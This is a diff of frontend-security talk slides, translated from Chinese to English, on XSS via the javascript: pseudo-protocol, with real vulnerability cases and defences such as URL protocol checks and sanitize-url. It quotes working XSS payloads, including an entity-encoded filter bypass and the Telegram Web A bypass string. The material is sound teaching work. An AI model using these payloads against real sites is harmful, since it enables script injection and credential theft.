+# The Dangers of javascript:
 
-- 範例：填入 Youtube 影片網址，在文章自動嵌入
+- Example: Embedding a YouTube video
 <div class='ml-6'>
 
 ```html
-<!-- 把 javascript:alert(1) 當作 YouTube 網址填入，就是 XSS 漏洞 -->
+<!-- Inserting javascript:alert(1) as the YouTube URL creates an XSS vulnerability -->
 <iframe src="<?= $youtube_url ?>" width="500" height="300"></iframe>
 ```
 
 </div>
 
-- 範例：在 profile 填入部落格網址並加上超連結
-  - 實際案例：[Hahow 漏洞](https://zeroday.hitcon.org/vulnerability/ZD-2020-00903)
-- 前端框架的防禦措施
-  - ✅ 一般會做好跳脫字元
-    - 沒使用 React 的 `dangerouslySetInnerHTML` 或 Vue 的 `v-html`，不會有問題
-  - 🔺 但不會防範 `href` （[demo](https://codesandbox.io/p/sandbox/xss-demo-javascript-in-react-lr7zyt)）
-    - React v16.9 後會針對 `javascript:` 印出警告（[ref](https://github.com/facebook/react/issues/16592)），可能未來會針對 `javascript:` 跳錯，但目前還是會執行
+- Example: Adding a blog link to a profile
+  - Real case: [Hahow vulnerability](https://zeroday.hitcon.org/vulnerability/ZD-2020-00903)
+- Frontend framework 
+  - ✅ Usually escapes characters properly
+    - No issues if React’s `dangerouslySetInnerHTML` or Vue’s `v-html` are not used
+  - 🔺 It doesn’t prevent `href`（[demo](https://codesandbox.io/p/sandbox/xss-demo-javascript-in-react-lr7zyt)）
+    - React v16.9+ prints warnings for `javascript:` and may block it in the future, but it still executes for now（[ref](https://github.com/facebook/react/issues/16592)）
 
 ---
 
-# javascript: 的危險性
+# The Dangers of javascript:
 
-- 補充案例：[Lexical](https://github.com/facebook/lexical) 曾有過處理連結時沒防禦 `javascript:` 的 [issue](https://github.com/facebook/lexical/issues/2806)
-  - 目前處理方式：用 `new URL` 來看 protocol 是否符合（[ref](https://github.com/facebook/lexical/blob/790b5161d2f15e22bc5d7037a2e2f5fca5795af7/packages/lexical-link/src/index.ts#L175-L186)）
+- Additional case: [Lexical](https://github.com/facebook/lexical) once had an [issue](https://github.com/facebook/lexical/issues/2806) where it didn’t defend against `javascript:` in links
+  - Current: Uses `new URL` to verify the protocol（[ref](https://github.com/facebook/lexical/blob/790b5161d2f15e22bc5d7037a2e2f5fca5795af7/packages/lexical-link/src/index.ts#L175-L186)）
 
 <div class='ml-6'>
 
@@ -668,16 +678,16 @@ const SUPPORTED_URL_PROTOCOLS = new Set([
 
 // ...
 sanitizeUrl(url: string): string {
-try {
-const parsedUrl = new URL(url);
-// eslint-disable-next-line no-script-url
-if (!SUPPORTED_URL_PROTOCOLS.has(parsedUrl.protocol)) {
-return 'about:blank';
-}
-} catch {
-return url;
-}
-return url;
+  try {
+    const parsedUrl = new URL(url);
+    // eslint-disable-next-line no-script-url
+    if (!SUPPORTED_URL_PROTOCOLS.has(parsedUrl.protocol)) {
+    return 'about:blank';
+    }
+  } catch {
+    return url;
+  }
+    return url;
 }
 
 ```
@@ -686,11 +696,11 @@ return url;
 
 ---
 
-# 頁面跳轉的風險
+# Risks of Page Redirection
 
-參考：[在做跳轉功能時應該注意的問題：Open Redirect](https://tech-blog.cymetrics.io/posts/huli/open-redirect/)
+ref: [在做跳轉功能時應該注意的問題：Open Redirect](https://tech-blog.cymetrics.io/posts/huli/open-redirect/)
 
-- 登入後重導向
+- Redirect after login
 
 <div class='ml-6'>
 
@@ -698,13 +708,13 @@ return url;
 const searchParams = new URLSearchParams(location.search);
 window.location = searchParams.get("redirect");
 
-// 問題：window.location 也可填入 javascript: 偽協議
+// Issue: window.location can also accept the javascript: pseudo-protocol
 ```
 
 </div>
 
-- 漏洞案例：Matters News
-  - 攻擊方式：寄送包含惡意連結的釣魚信，使用者點擊後進入合法網站並輸入帳密，登入後以 XSS 偷走帳密，再把使用者轉回首頁
+- Vulnerability case: Matters News
+  - Attack method: A phishing email with a malicious link leads the user to a legitimate website. After logging in, XSS is used to steal credentials, then the user is redirected back to the homepage
 
 <div class='ml-6'>
 
@@ -715,23 +725,23 @@ window.location = searchParams.get("redirect");
  * (works on CSR)
  */
 
-// 登入後呼叫 redirectToTarget
+// Call redirectToTarget after login
 export const redirectToTarget = ({
 fallback = 'current',
 }: {
 fallback?: 'homepage' | 'current'
 } = {}) => {
-const fallbackTarget =
-fallback === 'homepage'
-? `/` // FIXME: to purge cache
-: window.location.href
-const target = getTarget() || fallbackTarget
+  const fallbackTarget =
+  fallback === 'homepage'
+  ? `/` // FIXME: to purge cache
+  : window.location.href
+  const target = getTarget() || fallbackTarget
 
-window.location.href = decodeURIComponent(target)
+  window.location.href = decodeURIComponent(target)
 }
 
-// getTarget() 從 query string 拿出值，然後用 window.location.href = decodeURIComponent(target) 重新導向
-// 如果登入網址是 https://matters.news/login?target=javascript:alert(1)，登入後執行轉導時就會跳出 alert
+// getTarget() gets the value from the query string, then redirects using window.location.href = decodeURIComponent(target)
+// If the login URL is https://matters.news/login?target=javascript:alert(1), after logging in, it will trigger an alert
 
 ```
 
@@ -739,28 +749,28 @@ window.location.href = decodeURIComponent(target)
 
 ---
 
-# javascript: 的防禦方式
+# Ways to Defend against javascript:
 
 <br class='hidden'/>
 
-💯推薦：用 [`sanitize-url`](https://github.com/braintree/sanitize-url) 這類 library 防禦
+💯 Recommend: Use libraries like [`sanitize-url`](https://github.com/braintree/sanitize-url) for protection
 
-#### 自己防禦的話...
+#### If you want to defend yourself...
 
-- ⛔ 過濾字串中的 `javascript:`
+- ⛔ Filter `javascript:` in the string
 
 <div class='ml-6'>
 
 ```html
-<!-- HTML 屬性值可編碼，以下仍可攻擊 -->
+<!-- HTML attribute values can be encoded, and this can still be exploited -->
 <a href="&#106avascript&colon;alert(1)">click me</a>
 ```
 
 </div>
 
-- ✅ 只允許 `http://` 跟 `https://` 開頭字串
-- ✅✅ 利用 JavaScript 解析 URL
-  - 根據 protocol 判斷是否為合法協議
+- ✅ Only allow strings starting with `http://` or `https://`
+- ✅✅ Parse the URL using JavaScript
+  - Validate the protocol to ensure it's safe
 
 <div class='ml-6'>
 
@@ -781,12 +791,12 @@ console.log(new URL("javascript:alert(1)"));
 
 ---
 
-# javascript: 的防禦方式
+# Ways to Defend against javascript:
 
-#### 自己防禦的話...
+#### If you want to defend yourself...
 
-- ✅ 用 RegExp 判斷
-  - 可參考 React 的實作([ref](https://github.com/facebook/react/blob/v18.2.0/packages/react-dom/src/shared/sanitizeURL.js#L22))
+- ✅ Use RegExp
+  - Refer to React's implementation([ref](https://github.com/facebook/react/blob/v18.2.0/packages/react-dom/src/shared/sanitizeURL.js#L22))
 
 <div class='ml-6'>
 
@@ -797,46 +807,58 @@ const isJavaScriptProtocol =
 
 </div>
 
-- 🔺 連結加入 `target="_blank"` 屬性，由瀏覽器處理
-  - 各瀏覽器點 `javascript:` 開頭連結的反應
-    - Chrome：新開一個網址為 `about:blank#blocked` 的分頁
-    - Firefox：新開一個沒網址的分頁
-    - Safari：什麼都不會發生
-  - 仍有漏洞：滑鼠中鍵點連結，仍會執行 JavaScript
+- 🔺 Add `target="_blank"` to links, letting the browser handle them.
+  - Browser behavior when clicking `javascript:` links
+    - Chrome: Opens a new tab with `about:blank#blocked`
+    - Firefox: Opens a new tab without a URL
+    - Safari: Nothing happens
+  - Remaining vulnerability: Clicking with the middle mouse button still executes JavaScript
 
 ---
 
-# 漏洞案例：Telegram 網頁版 javascript: 漏洞
+# Vulnerability Case: javascript: Vulnerability in Telegram
 
-出處：[История одной XSS в Telegram](https://habr.com/ru/articles/744316/)
+ref: [История одной XSS в Telegram](https://habr.com/ru/articles/744316/)
 
-- 背景
+- Background
 
 <div class='ml-6'>
 
 ```js {*}{maxHeight:'80px'}
-// Telegram Web A 的 ensureProtocol 會確認 URL 有沒有 ://，沒有就自動加 http://
+// Telegram Web A's ensureProtocol checks if the URL has ://, and if not, it automatically adds http://
 
 export function ensureProtocol(url?: string) {
-if (!url) {
-return undefined;
-}
-return url.includes('://') ? url : `http://${url}`;
+  if (!url) {
+    return undefined;
+  }
+  return url.includes('://') ? url : `http://${url}`;
 }
 
 ```
 
 </div>
 
-- 問題：URL 最前面可帶上帳號密碼(HTTP Authentication 時用)，以 `:` 區隔帳號密碼
-  - 如：`javascript:alert@github.com/#://` 可繞過函式和伺服器的檢查
-    - 🔺 伺服器視為合法網址，瀏覽器視為 JavaScript，阻擋失敗
-  - 攻擊實作
+- Vulnerability Mechanism: URLs can include a username and password (HTTP Basic Authentication), separated by `:`
+  - e.g. `javascript:alert@github.com/#://` can bypass the function and server checks
+    - The server sees it as a valid URL, the browser sees it as JavaScript → 🔺 block failed
 
-<div class='ml-12'>
+<div class='note-block'>
+💡 HTTP Basic Authentication（ref: <a href="https://zh.wikipedia.org/zh-tw/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81" target="_blank">HTTP基本認證</a>、<a href="https://carsonwah.github.io/http-authentication.html" target="_blank">開發者必備知識 - HTTP認證（HTTP Authentication）</a>）
+</div>
 
-```js {*}{maxHeight:'80px'}
-// 搭配 URL 編碼，產出伺服器認為的合法連結，瀏覽器認為的 XSS payload
+
+---
+
+# Vulnerability Case: javascript: Vulnerability in Telegram
+
+ref: [История одной XSS в Telegram](https://habr.com/ru/articles/744316/)
+
+- Attack implementation
+
+<div class='ml-6'>
+
+```js
+// Use URL encoding to create a link that the server sees as valid but the browser treats as an XSS payload
 javascript:alert%28%27Slonser%20was%20here%21%27%29%3B%2F%2F@github.com#;alert(10);://eow5kas78d0wlv0.m.pipedream.net%27
 
 // after decoded
@@ -845,30 +867,45 @@ javascript:alert('Slonser was here!');//@github.com#;alert(10);://eow5kas78d0wlv
 
 </div>
 
-- 修復方式：以 `new URL` 確認 protocol 非 `javascript:`
+- Fix: Use `new URL` to ensure the protocol is not `javascript:`
+
+<div class='ml-6'>
+
+```js {*}{maxHeight:'150px'}
+export function ensureProtocol(url?: string) {
+  if (!url) {
+    return undefined;
+  }
+
+  // HTTP was chosen by default as a fix for https://bugs.telegram.org/c/10712.
+  // It is also the default protocol in the official TDesktop client.
+  try {
+    const parsedUrl = new URL(url);
+    // eslint-disable-next-line no-script-url
+    if (parsedUrl.protocol === 'javascript:') {
+      return `http://${url}`;
+    }
+
+    return url;
+  } catch (err) {
+    return `http://${url}`;
+  }
+}
+```
+
+</div>
 
 ---
 
-# 小結
+# Summary
 
-- 瀏覽器的安全模型：瀏覽器不給網頁前端 JavaScript 的東西，拿不到就是拿不到
-- XSS 代表攻擊者可以在其他人網站上執行 JavaScript
-- 能夠執行 JavaScript 的方式
-  - `<script>` 標籤
-  - 屬性中的 event handler（都會是 on 開頭）
-  - `javascript:` 偽協議
-- 永遠不要相信使用者的輸入
-- 善用第三方 library 處理/防禦使用者輸入
-- XSS 的多道防線：Sanitization、CSP、降低影響範圍
-
----
-
-# References
-
-- 《Beyond XSS：探索網頁前端資安宇宙》 Ch1
-- https://www.cloudthat.com/resources/blog/exploring-security-for-frontend-development
-- https://blog.bitsrc.io/frontend-application-security-tips-practices-f9be12169e66
-- https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe
+- Never trust user input
+- Use third-party libraries to handle/defend against user input
+- This is just a small part of frontend security, there's much more...
+  - Multiple layers of XSS defense and bypass techniques
+  - Attacks without JavaScript
+  - Cross-site attacks
+  - Other security topic
 
 ---
 
@@ -876,5 +913,14 @@ javascript:alert('Slonser was here!');//@github.com#;alert(10);://eow5kas78d0wlv
 layout: center
 class: text-center
 ```
-
+# Thanks for Listening!
 # Q & A
+
+---
+
+# Reference
+
+- 《Beyond XSS：探索網頁前端資安宇宙》 Chapter 1
+- https://www.cloudthat.com/resources/blog/exploring-security-for-frontend-development
+- https://blog.bitsrc.io/frontend-application-security-tips-practices-f9be12169e66
+- https://medium.com/starbugs/%E5%9F%B7%E8%A1%8C-javascript-%E7%9A%84-v8-%E5%BC%95%E6%93%8E%E5%81%9A%E4%BA%86%E4%BB%80%E9%BA%BC-f97e5b4b3fbe
